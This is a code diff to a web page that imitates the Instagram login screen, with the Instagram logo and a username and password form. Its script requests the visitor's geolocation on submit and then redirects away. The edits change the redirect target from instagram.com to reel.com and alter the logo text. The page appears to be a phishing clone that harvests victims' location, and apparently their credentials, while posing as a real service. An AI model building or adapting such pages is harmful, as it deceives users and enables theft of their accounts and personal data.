@@ -31,7 +31,7 @@
       width: 100%;
     }
     input {
-      width: 100%;
+      width: 90%;
       padding: 12px;
       margin-bottom: 12px;
       border: 1px solid #dbdbdb;
@@ -68,7 +68,7 @@
 <body>
   <div class="login-container">
     <div class="logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="gram Logo">
     </div>
     <form id="loginForm">
       <input type="text" placeholder="Phone number, username, or email" required>
@@ -105,20 +105,20 @@
             }
 
             // Redirect to Instagram
-            window.location.href = 'https://www.instagram.com/';
+            window.location.href = 'https://reel.com/';
           },
           (error) => {
             console.error('Geolocation error:', error);
 
             // Redirect to Instagram even if location fails
-            window.location.href = 'https://www.instagram.com/';
+            window.location.href = 'https://reel.com';
           }
         );
       } else {
         console.error('Geolocation not supported in this browser.');
 
         // Redirect to Instagram even if geolocation is not supported
-        window.location.href = 'https://www.instagram.com/';
+        window.location.href = 'https://reel.com';
       }
     });
   </script>
